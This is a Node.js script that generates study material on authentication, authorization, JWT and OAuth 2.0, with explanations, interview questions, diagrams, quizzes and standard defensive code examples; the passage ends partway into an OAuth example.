const fs = require('fs');

function codeBlock(lines) { return lines.join('\n'); }
function q(question, answer) { return { question: question.replace(/'/g,"\\'"), answer: answer.replace(/'/g,"\\'") }; }
function m(question, options, answer, explanation) { return { question: question.replace(/'/g,"\\'"), options: options, answer: answer, explanation: explanation.replace(/'/g,"\\'") }; }
function e(title, useCase, code, description) { return { title: title.replace(/'/g,"\\'"), useCase: useCase.replace(/'/g,"\\'"), code: code, description: description.replace(/'/g,"\\'") }; }
function d(heading, text) { return { heading: heading.replace(/'/g,"\\'"), text: text.replace(/'/g,"\\'") }; }
function svgW(w, h, title, inner) {
  return '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="max-width:100%;height:auto;font-family:sans-serif">' +
    '<rect x="0" y="0" width="'+w+'" height="'+h+'" rx="8" fill="#f8f9fa" stroke="#dee2e6" stroke-width="1"/>' +
    '<text x="'+(w/2)+'" y="24" text-anchor="middle" font-size="14" font-weight="bold" fill="#333">'+title+'</text>' +
    inner + '</svg>';
}
function R(x,y,w,h,fill,stroke,t1,t2,c1,c2) {
  var box = '<rect x="'+x+'" y="'+y+'" width="'+w+'" height="'+h+'" rx="4" fill="'+fill+'" stroke="'+(stroke||fill)+'" stroke-width="1"/>';
  if (t1) box += '<text x="'+(x+w/2)+'" y="'+(y+(t2?16:20))+'" text-anchor="middle" font-size="11" font-weight="bold" fill="'+(c1||'#fff')+'">'+t1+'</text>';
  if (t2) box += '<text x="'+(x+w/2)+'" y="'+(y+28)+'" text-anchor="middle" font-size="9" fill="'+(c2||'#ddd')+'">'+t2+'</text>';
  return box;
}
function A(x1,y1,x2,y2,c) {
  return '<line x1="'+x1+'" y1="'+y1+'" x2="'+x2+'" y2="'+y2+'" stroke="'+(c||'#666')+'" stroke-width="1.5" marker-end="url(#arrow)"/>';
}
function T(x,y,text,size,color,anchor) {
  return '<text x="'+x+'" y="'+y+'" font-size="'+(size||10)+'" fill="'+(color||'#333')+'" text-anchor="'+(anchor||'start')+'">'+text+'</text>';
}

var topics = {};
var topicList = [];

function addTopic(id, title, difficulty, estimatedMinutes, tldrItems, laymanDef, deepDiveArr, interviewAns, questionsArr, svgInner, codeExamplesArr, mcqArr) {
  var t = {
    id: id, title: title, difficulty: difficulty, estimatedMinutes: estimatedMinutes,
    tldr: tldrItems, laymanDefinition: laymanDef, deepDive: deepDiveArr,
    interviewAnswer: interviewAns, interviewQuestions: questionsArr,
    diagramSvg: svgW(500, 200, title, svgInner), codeExamples: codeExamplesArr, mcqQuestions: mcqArr
  };
  topics[id] = t;
  topicList.push({ id: id, title: title, difficulty: difficulty, estimatedMinutes: estimatedMinutes, file: id + '.json' });
}

/* =================== TOPIC 1: Authentication =================== */
addTopic('auth-authentication', 'Authentication', 'beginner', 20,
  ['Authentication (AuthN) is the process of verifying who a user is — validating their identity.',
   'Common methods: password-based, multi-factor (MFA), biometric, social login, SSO, and certificate-based.',
   'Authentication answers "Who are you?" while authorization answers "What can you do?" — they are distinct concepts.',
   'Modern authentication factors: something you know (password), something you have (phone/OTP), something you are (biometric).'
  ],
  'Authentication is like showing your ID at airport security. You present credentials (passport/boarding pass) to prove who you are. The agent verifies that the photo matches your face. If it matches, you are authenticated. Now you can proceed to the gate.',
  [
    d('Authentication Factors', 'Knowledge: passwords, PINs, security questions (weakest). Possession: phone, hardware token, smart card. Inherence: fingerprint, face, voice, iris. Location: GPS, IP range. Time: access window restrictions. MFA combines 2+ factors for stronger security.'),
    d('Password-Based Authentication', 'User provides username + password. Password is hashed (bcrypt, Argon2) and compared to stored hash. Never store plaintext passwords. Use slow, salted hashing algorithms. Enforce password strength policies. Implement rate limiting to prevent brute force.'),
    d('Multi-Factor Authentication (MFA)', 'Requires 2+ authentication factors. TOTP (Time-based One-Time Password): RFC 6238, 30-second rotating codes. SMS/Email OTP: convenience code sent. Push notification: approve/deny on phone. Hardware keys: YubiKey, WebAuthn.'),
    d('Session vs Token Authentication', 'Session-based: server stores session, client receives cookie. Stateful, requires server memory or shared session store. Token-based: client stores JWT/token, server validates signature. Stateless, scalable, but tokens cannot be revoked easily.'),
    d('Single Sign-On (SSO)', 'One authentication credential grants access to multiple applications. Protocols: SAML (enterprise), OAuth 2.0 + OpenID Connect (modern). Benefits: centralized authentication, reduced password fatigue, consistent security policies.')
  ],
  'Authentication verifies identity. Choose the right method based on security requirements and user experience. MFA is strongly recommended. Use password hashing best practices (bcrypt/Argon2). Understand the trade-offs between session and token-based approaches.',
  [
    q('What is authentication?', 'The process of verifying a user\'s identity. Answers "who are you?"'),
    q('What are the three authentication factors?', 'Knowledge (something you know), Possession (something you have), Inherence (something you are).'),
    q('What is MFA?', 'Multi-Factor Authentication — requires two or more authentication factors for stronger security.'),
    q('What is the difference between session and token auth?', 'Session auth is stateful (server stores session). Token auth is stateless (client holds token). Token auth scales better but tokens cannot be easily revoked.'),
    q('What is SSO?', 'Single Sign-On — one authentication grants access to multiple applications. Examples: Google SSO, enterprise SAML.'),
    q('Should you store passwords in plaintext?', 'Never. Always hash passwords with a slow, salted algorithm like bcrypt or Argon2.'),
    q('What is TOTP?', 'Time-based One-Time Password — a 6-digit code that changes every 30 seconds, generated by apps like Google Authenticator.'),
    q('What is WebAuthn?', 'A web standard for passwordless authentication using public-key cryptography. Supports biometrics and hardware tokens.'),
    q('What is the difference between authentication and authorization?', 'Authentication verifies identity (who you are). Authorization determines permissions (what you can do).'),
    q('What is OTP?', 'One-Time Password — a temporary code sent via SMS, email, or generated by an authenticator app.')
  ],
  R(10,35,100,25,'#0070f3','','Password','Knowledge') +
  R(10,65,100,25,'#28a745','','MFA','2+ factors') +
  R(10,95,100,25,'#ffc107','','Session','Stateful') +
  R(10,125,100,25,'#dc3545','','Token','Stateless') +
  R(10,155,100,25,'#e83e8c','','SSO','One login') +
  A(110,48,140,48) + A(110,78,140,78) + A(110,108,140,108) + A(110,138,140,138) + A(110,168,140,168) +
  R(150,35,230,155,'#17a2b8','','Authentication','Verifying identity: passwords, MFA, sessions, tokens, and SSO.') +
  T(240,220,'Authentication: Verifying user identity through various factors and methods.',9,'#666','middle'),
  [
    e('Password Hashing with bcrypt (Node.js)', 'Secure password storage.', codeBlock([
      'const bcrypt = require(\'bcrypt\');',
      'const saltRounds = 12;',
      '',
      '// Signup: hash password',
      'async function signup(password) {',
      '  const hash = await bcrypt.hash(password, saltRounds);',
      '  await db.query("INSERT INTO users (password_hash) VALUES ($1)", [hash]);',
      '}',
      '',
      '// Login: verify password',
      'async function login(password, storedHash) {',
      '  const match = await bcrypt.compare(password, storedHash);',
      '  return match; // true/false',
      '}'
    ]), 'Secure password hashing with bcrypt — never store plaintext passwords.'),
    e('Session Auth (Express)', 'Traditional session-based auth.', codeBlock([
      "const session = require('express-session');",
      'const redis = require(\'redis\').createClient();',
      '',
      "app.use(session({",
      "  store: new RedisStore({ client: redis }),",
      "  secret: process.env.SESSION_SECRET,",
      "  resave: false,",
      "  saveUninitialized: false,",
      "  cookie: { secure: true, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }",
      "}));",
      '',
      "app.post('/login', async (req, res) => {",
      '  const user = await authenticate(req.body);',
      '  req.session.userId = user.id; // stored in session',
      '  res.json({ success: true });',
      '});'
    ]), 'Session authentication with Express, Redis store, and secure cookies.'),
    e('TOTP with speakeasy (Node.js)', 'MFA implementation.', codeBlock([
      'const speakeasy = require(\'speakeasy\');',
      'const qrcode = require(\'qrcode\');',
      '',
      '// Setup: generate secret',
      'const secret = speakeasy.generateSecret({ name: \'MyApp\' });',
      "// Store secret.base32 in user record",
      '',
      '// Generate QR code for authenticator app',
      'qrcode.toDataURL(secret.otpauth_url, (err, data) => {',
      '  // Show QR to user',
      '});',
      '',
      '// Verify: validate TOTP code',
      'const isValid = speakeasy.totp.verify({',
      '  secret: user.totpSecret,',
      '  encoding: \'base32\',',
      "  token: req.body.token",
      '});'
    ]), 'TOTP setup and verification with speakeasy library.'),
    e('Biometric Auth (WebAuthn)', 'Passwordless authentication.', codeBlock([
      "// Registration (browser API)",
      "const credential = await navigator.credentials.create({",
      "  publicKey: {",
      "    challenge: new Uint8Array(32),",
      "    rp: { name: 'My App' },",
      "    user: { id: userId, name: 'alice' },",
      "    pubKeyCredParams: [{ type: 'public-key', alg: -7 }],",
      "    authenticatorSelection: { authenticatorAttachment: 'platform' }",
      "  }",
      "});",
      '',
      "// Authentication",
      "const assertion = await navigator.credentials.get({",
      "  publicKey: {",
      "    challenge: new Uint8Array(32),",
      "    allowCredentials: [{ id: credentialId, type: 'public-key' }]",
      "  }",
      "});"
    ]), 'WebAuthn enables passwordless biometric authentication using platform authenticators.'),
    e('Rate Limiting for Auth (Express)', 'Brute force protection.', codeBlock([
      'const rateLimit = require(\'express-rate-limit\');',
      '',
      'const authLimiter = rateLimit({',
      '  windowMs: 15 * 60 * 1000, // 15 minutes',
      '  max: 5, // 5 attempts per window',
      '  message: { error: \'Too many attempts, try again later\' }',
      '});',
      '',
      "app.post('/login', authLimiter, async (req, res) => {",
      '  // login logic',
      '});',
      '',
      '// Also implement account lockout:',
      '// After N failed attempts, lock account for M minutes'
    ]), 'Rate limiting prevents brute force attacks on authentication endpoints.')
  ],
  [
    m('What does authentication verify?', ['User permissions', 'User identity', 'User location', 'User device'], 1, 'Authentication verifies identity — who the user is.'),
    m('What are the three authentication factors?', ['Know, Have, Are', 'See, Hear, Touch', 'Read, Write, Execute', 'Past, Present, Future'], 0, 'Knowledge (know), Possession (have), Inherence (are).'),
    m('What is MFA?', ['One password', 'Two or more factors', 'Email verification', 'Biometric only'], 1, 'MFA requires multiple authentication factors.'),
    m('What is the difference between authN and authZ?', ['AuthN = identity, AuthZ = permissions', 'AuthN = permissions, AuthZ = identity', 'They are the same', 'AuthN is for admins only'], 0, 'AuthN verifies who you are; AuthZ determines what you can do.'),
    m('Which is stateless?', ['Session auth', 'Token auth', 'Both', 'Neither'], 1, 'Token-based authentication is stateless — the server does not store session data.'),
    m('What algorithm is best for password hashing?', ['MD5', 'SHA-256', 'bcrypt/Argon2', 'Base64'], 2, 'bcrypt and Argon2 are slow, salted hashing algorithms designed for passwords.')
  ]
);

/* =================== TOPIC 2: Authorization =================== */
addTopic('auth-authorization', 'Authorization', 'intermediate', 20,
  ['Authorization (AuthZ) determines what an authenticated user is allowed to do — their permissions and access rights.',
   'Authorization happens AFTER authentication. First the system verifies who you are, then checks what you can access.',
   'Common models: RBAC (Role-Based), ABAC (Attribute-Based), PBAC (Policy-Based), ACL (Access Control Lists).',
   'Authorization is enforced at multiple layers: API routes, service layer, database queries (RLS).'
  ],
  'Authorization is the bouncer at a VIP section. Authentication was the ID check at the front door. Now that you are inside, the bouncer checks your wristband (role) to see if you can enter the VIP area. Even if authenticated, you may not be authorized for everything.',
  [
    d('RBAC (Role-Based Access Control)', 'Users assigned to roles, roles have permissions. Simple to manage at scale. Example: Admin, Manager, Employee roles. Role hierarchy: Admin inherits Manager permissions. Most common authorization model in web applications.'),
    d('ABAC (Attribute-Based Access Control)', 'Access decisions based on user attributes, resource attributes, and environment context. Example: "Managers from department X can edit documents created in the last 30 days." More flexible but complex: policy engine needed.'),
    d('Authorization Levels', 'Route-level: middleware checks roles before allowing access. Service-level: business logic checks permissions. Data-level: Row-Level Security (RLS) in database, field-level visibility. Defense in depth: enforce at multiple levels.'),
    d('JWT Authorization', 'Tokens contain claims (user role, permissions). Server validates signature and checks claims on each request. No session lookup needed (stateless). Trade-off: claims are fixed until token expires — role changes require token reissue.'),
    d('API Key Authorization', 'Long-lived keys for machine-to-machine communication. No user context. Simple but less secure. Must rotate periodically. Used for third-party API access, service accounts, CI/CD pipelines.')
  ],
  'Authorization controls access after authentication. RBAC is the most practical starting point. Enforce authorization at multiple layers (API, service, database). Never trust client-side authorization checks — always validate on the server.',
  [
    q('What is authorization?', 'The process of determining what an authenticated user is allowed to access or do.'),
    q('What is the difference between authentication and authorization?', 'Authentication = who you are. Authorization = what you can do. AuthN comes first.'),
    q('What is RBAC?', 'Role-Based Access Control — users have roles, roles have permissions. Simple and scalable.'),
    q('What is ABAC?', 'Attribute-Based Access Control — access decisions based on user/resource/environment attributes. More flexible but complex.'),
    q('How is authorization enforced in web apps?', 'Route middleware, service layer validation, database-level RLS. Multiple layers for defense in depth.'),
    q('What is Row-Level Security?', 'Database-level authorization — policies control which rows a user can see/modify based on their attributes.'),
    q('How does JWT handle authorization?', 'JWT contains claims like role and permissions. The server validates the signature and checks claims on each request.'),
    q('What is an ACL?', 'Access Control List — a list of permissions attached to an object specifying which users/roles can access it.'),
    q('What is the principle of least privilege?', 'Users should have the minimum permissions necessary to do their job. No more.'),
    q('What is defense in depth?', 'Enforcing authorization at multiple layers: network, API, service, and data layer.')
  ],
  R(10,35,110,25,'#0070f3','','AuthN','Who are you?') +
  A(120,48,160,48) +
  R(170,35,110,25,'#28a745','','AuthZ','What can you do?') +
  R(10,70,110,25,'#ffc107','','RBAC','Roles') +
  R(10,100,110,25,'#dc3545','','ABAC','Attributes') +
  R(10,130,110,25,'#e83e8c','','RLS','Data level') +
  R(170,70,110,25,'#6610f2','','JWT Claims','Stateless') +
  R(290,35,190,160,'#17a2b8','','Authorization','Controlling access: RBAC, ABAC, JWT claims, and multi-layer enforcement.') +
  T(240,225,'Authorization: Controlling what authenticated users can access. AuthN -> AuthZ.',9,'#666','middle'),
  [
    e('RBAC Middleware (Express)', 'Route-level authorization.', codeBlock([
      'function authorize(...allowedRoles) {',
      '  return (req, res, next) => {',
      '    const userRole = req.user.role;',
      '    if (!allowedRoles.includes(userRole)) {',
      '      return res.status(403).json({',
      '        error: \'Insufficient permissions\'',
      '      });',
      '    }',
      '    next();',
      '  };',
      '}',
      '',
      "app.delete('/api/users/:id',",
      "  authenticate,", 
      "  authorize('admin'),",
      '  async (req, res) => {',
      '    // Only admin can delete users',
      '  }',
      ');'
    ]), 'Route-level authorization middleware checking user roles.'),
    e('ABAC Policy (Casl)', 'Attribute-based authorization.', codeBlock([
      'const { AbilityBuilder, Ability } = require(\'@casl/ability\');',
      '',
      'function defineAbilityFor(user) {',
      '  const { can, cannot, build } = new AbilityBuilder(Ability);',
      '',
      "  can('read', 'Article', { published: true });",
      '',
      "  if (user.role === 'admin') {",
      "    can('manage', 'all');",
      '  } else {',
      "    can('update', 'Article', { authorId: user.id });",
      "    cannot('delete', 'Article');",
      '  }',
      '',
      "  if (user.isPremium) {",
      "    can('read', 'PremiumArticle');",
      '  }',
      '',
      '  return build();',
      '}',
      '',
      '// Usage: ability.can(\'update\', article)',
      '// Returns true/false'
    ]), 'ABAC with CASL — flexible permission rules based on user attributes and resource conditions.'),
    e('Database-Level RLS (PostgreSQL)', 'Data-level authorization.', codeBlock([
      '-- Enable RLS on table',
      'ALTER TABLE documents ENABLE ROW LEVEL SECURITY;',
      '',
      '-- Policy: users see only their own documents',
      'CREATE POLICY user_documents ON documents',
      "USING (user_id = current_setting('app.user_id')::INT);",
      '',
      '-- Policy: managers can see department documents',
      'CREATE POLICY manager_documents ON documents',
      "FOR SELECT USING (department_id IN (",
      "  SELECT dept_id FROM user_depts",
      "  WHERE user_id = current_setting('app.user_id')::INT",
      "  AND role = 'manager'",
      '));'
    ]), 'RLS enforces data-level authorization directly in the database.'),
    e('Permission Check Service', 'Service-layer authorization.', codeBlock([
      'class DocumentService {',
      '  async updateDocument(docId, userId, updates) {',
      '    const doc = await Document.findByPk(docId);',
      '    ',
      '    // Authorization check',
      '    if (doc.userId !== userId &&',
      '        !(await this.isAdmin(userId))) {',
      '      throw new ForbiddenError();',
      '    }',
      '',
      '    // Business logic',
      '    return doc.update(updates);',
      '  }',
      '}'
    ]), 'Service-layer authorization ensures business logic checks permissions.'),
    e('API Key Auth for Services', 'Machine-to-machine auth.', codeBlock([
      '// Generate API key (hashed in DB)',
      'const crypto = require(\'crypto\');',
      'const apiKey = crypto.randomBytes(32).toString(\'hex\');',
      'const hash = crypto.createHash(\'sha256\').update(apiKey).digest(\'hex\');',
      '',
      '// Middleware',
      "app.use('/api/v1', async (req, res, next) => {",
      '  const key = req.headers[\'x-api-key\'];',
      '  if (!key) return res.status(401).json({ error: \'API key required\' });',
      '  const hash = crypto.createHash(\'sha256\').update(key).digest(\'hex\');',
      '  const service = await db.query(',
      '    "SELECT * FROM api_keys WHERE key_hash = $1", [hash]',
      '  );',
      '  if (!service.rows[0]) return res.status(403).json({ error: \'Invalid key\' });',
      '  req.service = service.rows[0];',
      '  next();',
      '});'
    ]), 'API key authentication for service-to-service communication.')
  ],
  [
    m('What comes first: authentication or authorization?', ['Authorization', 'Authentication', 'Both at once', 'Depends on system'], 1, 'Authentication (who you are) comes before authorization (what you can do).'),
    m('What does RBAC stand for?', ['Role-Based Access Control', 'Rule-Based Access Control', 'Resource-Based Auth Control', 'Role-Bound Application Control'], 0, 'RBAC = Role-Based Access Control.'),
    m('What authorization model uses attributes?', ['RBAC', 'ABAC', 'PBAC', 'DAC'], 1, 'ABAC uses user, resource, and environment attributes for decisions.'),
    m('Where should authorization be enforced?', ['Frontend only', 'Backend only', 'Multiple layers', 'Database only'], 2, 'Authorization should be enforced at API, service, and data layers (defense in depth).'),
    m('What is the principle of least privilege?', ['Maximum permissions', 'Minimum necessary permissions', 'No permissions', 'Admin for all'], 1, 'Least privilege means the minimum permissions needed to perform a task.'),
    m('What does RLS enforce?', ['Route access', 'Row-level access', 'Schema access', 'Table access'], 1, 'Row-Level Security enforces data-level access policies in the database.')
  ]
);

/* =================== TOPIC 3: JWT =================== */
addTopic('auth-jwt', 'JWT (JSON Web Tokens)', 'intermediate', 25,
  ['JWT is a compact, URL-safe token format for securely transmitting claims between parties. Defined by RFC 7519.',
   'Structure: Header (algorithm + type), Payload (claims), Signature (prevents tampering).',
   'JWTs are signed (integrity) but NOT encrypted (anyone with the token can read the payload). Do not store secrets in payload.',
   'Common use: stateless authentication (server validates signature without session lookup) and secure API access.'
  ],
  'A JWT is like a tamper-proof ID card. The header says "this uses SHA-256". The payload says "user_id: 42, role: admin". The signature is a cryptographic seal — if someone changes the payload, the seal breaks and the server rejects it. But anyone can read the card\'s contents.',
  [
    d('JWT Structure', 'Header: {"alg": "HS256", "typ": "JWT"}. Payload: {"sub": "123", "name": "Alice", "iat": 1516239022}. Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret). All three parts are base64url-encoded and dot-separated.'),
    d('Signing Algorithms', 'HS256 (HMAC with SHA-256): symmetric — same secret signs and verifies. RS256 (RSA with SHA-256): asymmetric — private key signs, public key verifies. ES256 (ECDSA): elliptic curve. For microservices: use RS256 so services can verify without the signing key.'),
    d('JWT Claims (Registered)', 'iss (issuer): who issued the token. sub (subject): who the token is about. aud (audience): intended recipient. exp (expiration): expiry timestamp. nbf (not before): token valid after this time. iat (issued at): when token was issued. jti (JWT ID): unique identifier.'),
    d('Token Lifetime and Refresh', 'Access tokens: short-lived (15 min). Refresh tokens: long-lived (7-30 days). JWT cannot be revoked server-side (stateless). Solution: short expiry + refresh tokens. For immediate revocation: maintain a blocklist (adds state).'),
    d('Security Best Practices', 'Store tokens securely (HttpOnly cookies, not localStorage for SPAs). Use short expiration. Validate all claims (exp, nbf, aud, iss). Use HTTPS. Rotate signing keys. Never put secrets in payload. Validate signature algorithm (prevent alg=none attack).')
  ],
  'JWT enables stateless authentication ideal for distributed systems and microservices. Understand the trade-off: stateless means scalable but tokens cannot be revoked. Always validate the signature, expiration, and audience. Never store sensitive data in the payload.',
  [
    q('What is JWT?', 'JSON Web Token — a compact, URL-safe token format for securely transmitting claims between parties. RFC 7519.'),
    q('What are the three parts of a JWT?', 'Header (algorithm + type), Payload (claims), Signature (cryptographic verification). Dot-separated: xxx.yyy.zzz.'),
    q('Are JWTs encrypted?', 'No. JWTs are signed to prevent tampering but the payload is base64-encoded (not encrypted). Anyone can decode and read the payload.'),
    q('What is the difference between HS256 and RS256?', 'HS256 is symmetric (same key for sign + verify). RS256 is asymmetric (private sign, public verify). RS256 is safer for microservices.'),
    q('How do you handle JWT revocation?', 'Short expiration times. Add refresh tokens. Maintain a blocklist for immediate revocation (adds state, but necessary for some use cases).'),
    q('What claims should a JWT include?', 'sub (user id), exp (expiry), iat (issued at), aud (audience), iss (issuer). Optionally: role, permissions.'),
    q('What is the alg=none attack?', 'An attacker changes the algorithm to "none" and removes the signature. Always validate that the algorithm matches what you expect.'),
    q('Where should you store JWTs in a browser?', 'HttpOnly, Secure, SameSite cookies are safest. localStorage is vulnerable to XSS.'),
    q('What is the typical access token lifetime?', '15 minutes for access tokens. Refresh tokens: 7-30 days.'),
    q('What does the jti claim do?', 'JWT ID — a unique identifier for the token. Can be used to prevent replay attacks by tracking used jti values.')
  ],
  R(10,35,100,25,'#0070f3','','Header','Algorithm') +
  R(10,65,100,25,'#28a745','','Payload','Claims') +
  R(10,95,100,25,'#ffc107','','Signature','Verification') +
  R(10,125,100,25,'#dc3545','','Access Token','15 min TTL') +
  R(10,155,100,25,'#e83e8c','','Refresh Token','7-30 day TTL') +
  A(110,48,140,48) + A(110,78,140,78) + A(110,108,140,108) + A(110,138,140,138) + A(110,168,140,168) +
  R(150,35,230,155,'#17a2b8','','JWT (JSON Web Token)','Signed, URL-safe token format for stateless authentication.') +
  T(240,220,'JWT: Header.Payload.Signature — compact, signed, stateless authentication tokens.',9,'#666','middle'),
  [
    e('JWT Sign and Verify (Node.js)', 'Using jsonwebtoken library.', codeBlock([
      'const jwt = require(\'jsonwebtoken\');',
      '',
      '// Sign (create token)',
      'const token = jwt.sign({',
      '  sub: user.id,',
      '  role: user.role,',
      '  name: user.name',
      '}, process.env.JWT_SECRET, {',
      "  expiresIn: '15m',",
      "  audience: 'my-app',",
      "  issuer: 'auth-service'",
      '});',
      '',
      '// Verify (validate token)',
      'try {',
      '  const decoded = jwt.verify(token, process.env.JWT_SECRET, {',
      "    audience: 'my-app',",
      "    issuer: 'auth-service'",
      '  });',
      '  req.user = decoded;',
      '} catch (err) {',
      '  // Token expired or invalid',
      '  res.status(401).json({ error: \'Invalid token\' });',
      '}'
    ]), 'JWT signing and verification with jsonwebtoken library.'),
    e('JWT Middleware (Express)', 'Protect routes with JWT.', codeBlock([
      "const authenticateJWT = (req, res, next) => {",
      '  const authHeader = req.headers.authorization;',
      '  ',
      '  if (!authHeader || !authHeader.startsWith(\'Bearer \')) {',
      '    return res.status(401).json({ error: \'Token required\' });',
      '  }',
      '',
      '  const token = authHeader.split(\' \')[1];',
      '',
      '  try {',
      '    const decoded = jwt.verify(token, process.env.JWT_SECRET);',
      '    req.user = decoded;',
      '    next();',
      '  } catch (err) {',
      '    if (err.name === \'TokenExpiredError\') {',
      '      return res.status(401).json({ error: \'Token expired\' });',
      '    }',
      '    return res.status(403).json({ error: \'Invalid token\' });',
      '  }',
      '};',
      '',
      "app.get('/api/profile', authenticateJWT, (req, res) => {",
      '  res.json({ user: req.user });',
      '});'
    ]), 'JWT authentication middleware for Express routes.'),
    e('RS256 Asymmetric JWT', 'Private/public key signing.', codeBlock([
      'const fs = require(\'fs\');',
      'const jwt = require(\'jsonwebtoken\');',
      '',
      '// Auth service (signs tokens)',
      'const privateKey = fs.readFileSync(\'private.pem\');',
      'const token = jwt.sign({ sub: user.id }, privateKey, {',
      "  algorithm: 'RS256',",
      "  expiresIn: '15m'",
      '});',
      '',
      '// API service (verifies tokens, no private key)',
      'const publicKey = fs.readFileSync(\'public.pem\');',
      'const decoded = jwt.verify(token, publicKey, {',
      "  algorithms: ['RS256']",
      '});',
      '',
      '// Generate keys: openssl genrsa -out private.pem 2048',
      '// openssl rsa -in private.pem -pubout -out public.pem'
    ]), 'RS256 allows services to verify tokens without access to the private signing key.'),
    e('JWT Decode (without verify)', 'NEVER trust decoded payload.', codeBlock([
      '// WARNING: This only decodes — no signature verification!',
      "const decoded = jwt.decode(token); // no secret needed!",
      '',
      '// Anyone can do this — the payload is readable',
      'console.log(decoded); // { sub: 42, role: \'admin\' }',
      '',
      '// ALWAYS verify before trusting:',
      'const verified = jwt.verify(token, secret);',
      '// Throws if signature is invalid, expired, etc.',
      '',
      '// NEVER trust: req.headers.authorization decoded payload',
      '// ALWAYS verify on the server'
    ]), 'Decoding without verification reveals payload but does not validate authenticity.'),
    e('Storing JWT in HttpOnly Cookie', 'Secure token storage.', codeBlock([
      "res.cookie('access_token', token, {",
      '  httpOnly: true, // not accessible via JS',
      '  secure: true,   // HTTPS only',
      "  sameSite: 'strict', // CSRF protection",
      '  maxAge: 15 * 60 * 1000 // 15 minutes',
      '});',
      '',
      '// Reading the cookie (cookie-parser middleware)',
      "app.use(cookieParser());",
      '',
      "const token = req.cookies.access_token;",
      '',
      '// HttpOnly prevents XSS from stealing the token',
      '// Secure prevents HTTP (man-in-the-middle)',
      "// SameSite prevents CSRF"
    ]), 'HttpOnly cookies are the most secure browser storage for JWTs.')
  ],
  [
    m('What are the three parts of a JWT?', ['Header, Body, Footer', 'Header, Payload, Signature', 'Header, Claims, Cipher', 'Meta, Data, Hash'], 1, 'JWT = Header.Payload.Signature (three dot-separated base64url parts).'),
    m('Are JWT payloads encrypted?', ['Yes', 'No, only signed', 'Yes if using JWE', 'Depends on algorithm'], 1, 'JWTs are signed (integrity) but payload is base64-encoded (readable). Use JWE for encryption.'),
    m('What algorithm is asymmetric?', ['HS256', 'RS256', 'Both', 'Neither'], 1, 'RS256 uses RSA key pair (private sign, public verify). HS256 uses a single shared secret.'),
    m('How do you handle JWT revocation?', ['Long-lived tokens', 'Short expiry + refresh tokens', 'Stored in database', 'Cannot be revoked'], 1, 'Use short expiration and refresh tokens. For immediate needs: blocklist with short TTL.'),
    m('Where should you NOT store JWTs?', ['HttpOnly cookie', 'localStorage', 'Memory', 'Authorization header'], 1, 'localStorage is vulnerable to XSS — use HttpOnly cookies instead.'),
    m('What is the default algorithm JWT attack?', ['alg=none', 'alg=HS256', 'alg=RS256', 'alg=ES256'], 0, 'Attackers change alg to "none" to bypass verification. Always validate the algorithm.')
  ]
);

/* =================== TOPIC 4: OAuth 2.0 =================== */
addTopic('auth-oauth', 'OAuth 2.0', 'advanced', 35,
  ['OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to user resources without sharing passwords.',
   'Roles: Resource Owner (user), Client (app), Authorization Server, Resource Server.',
   'Grant types: Authorization Code (most common, for server-side apps), Implicit (deprecated), Client Credentials (machine-to-machine), Resource Owner Password (legacy).',
   'OAuth 2.0 is for authorization, not authentication. OpenID Connect (OIDC) adds authentication on top of OAuth 2.0.'
  ],
  'OAuth 2.0 is like a valet key for your car. You give the valet (third-party app) a special key that only opens the doors and drives within a limited area (scoped access). The valet cannot open the trunk or change radio presets. When the valet is done, the key stops working.',
  [
    d('Authorization Code Grant (Best Practice)', 'User clicks "Login with Google". Redirected to auth server. User logs in and consents. Auth server returns authorization code to client (via redirect). Client exchanges code (with client secret) for access token. Token from server-side, never exposed to browser.'),
    d('PKCE (Proof Key for Code Exchange)', 'Extension to Authorization Code flow for public clients (SPAs, mobile apps). Client generates code_verifier (random string) and code_challenge (SHA-256 hash). Auth server verifies the challenge when exchanging code. Prevents authorization code interception.'),
    d('Client Credentials Grant', 'Machine-to-machine authentication. Client sends its credentials (client_id + client_secret) directly to auth server and receives access token. No user involvement. Used for: server-to-server APIs, background jobs, service accounts.'),
    d('Scopes and Consent', 'Scope defines what the client can access: openid, profile, email, read:orders, write:orders. Users see a consent screen listing requested scopes. Granular scopes allow minimal access. Best practice: request only scopes you need, use the least privileged scope.'),
    d('OpenID Connect (OIDC)', 'Authentication layer on top of OAuth 2.0. Adds ID token (JWT) containing user identity. UserInfo endpoint for getting user details. Standardized scopes: openid, profile, email. /authorize, /token, /userinfo endpoints. JWKS (JSON Web Key Set) for public key distribution.')
  ],
  'OAuth 2.0 is the industry standard for delegated authorization. Always use Authorization Code + PKCE for browser-based apps. Use Client Credentials for server-to-server. OIDC adds authentication. Never use Implicit grant (deprecated due to security issues).',
  [
    q('What is OAuth 2.0?', 'An authorization framework for delegated access — allowing third-party apps limited access without sharing user passwords.'),
    q('What are the four OAuth 2.0 roles?', 'Resource Owner (user), Client (app), Authorization Server, Resource Server (API).'),
    q('What is the best grant type for web apps?', 'Authorization Code + PKCE (Proof Key for Code Exchange).'),
    q('What is PKCE?', 'Proof Key for Code Exchange — prevents authorization code interception by public clients (SPAs, mobile apps).'),
    q('What is the difference between OAuth 2.0 and OpenID Connect?', 'OAuth 2.0 is for authorization (access tokens). OIDC adds authentication (ID token with user identity).'),
    q('What is an access token in OAuth?', 'A credential that represents authorization to access specific resources (scopes). Usually a JWT or opaque string.'),
    q('What is a refresh token in OAuth?', 'A long-lived token used to obtain new access tokens without user interaction.'),
    q('What is the Client Credentials grant?', 'For machine-to-machine communication. Client authenticates directly; no user involved.'),
    q('What are scopes?', 'Permissions that define what the client can access: read, write, profile, email, etc.'),
    q('What is the Implicit grant?', 'A deprecated OAuth 2.0 flow where access tokens are returned directly in the URL fragment. No longer recommended due to token interception risks.')
  ],
  R(10,35,110,25,'#0070f3','','Auth Code','Best for web') +
  R(10,65,110,25,'#28a745','','+PKCE','Secure SPA') +
  R(10,95,110,25,'#ffc107','','Client Cred','Machine') +
  R(10,125,110,25,'#dc3545','','Scopes','Permissions') +
  R(10,155,110,25,'#e83e8c','','OIDC','Auth layer') +
  A(120,48,150,48) + A(120,78,150,78) + A(120,108,150,108) + A(120,138,150,138) + A(120,168,150,168) +
  R(160,35,220,155,'#17a2b8','','OAuth 2.0','Delegated authorization framework — access without sharing passwords.') +
  T(240,220,'OAuth 2.0: Authorization Code + PKCE, Client Credentials, Scopes, and OpenID Connect.',9,'#666','middle'),
  [
    e('Authorization Code Flow (Express)', 'OAuth 2.0 with Google.', codeBlock([
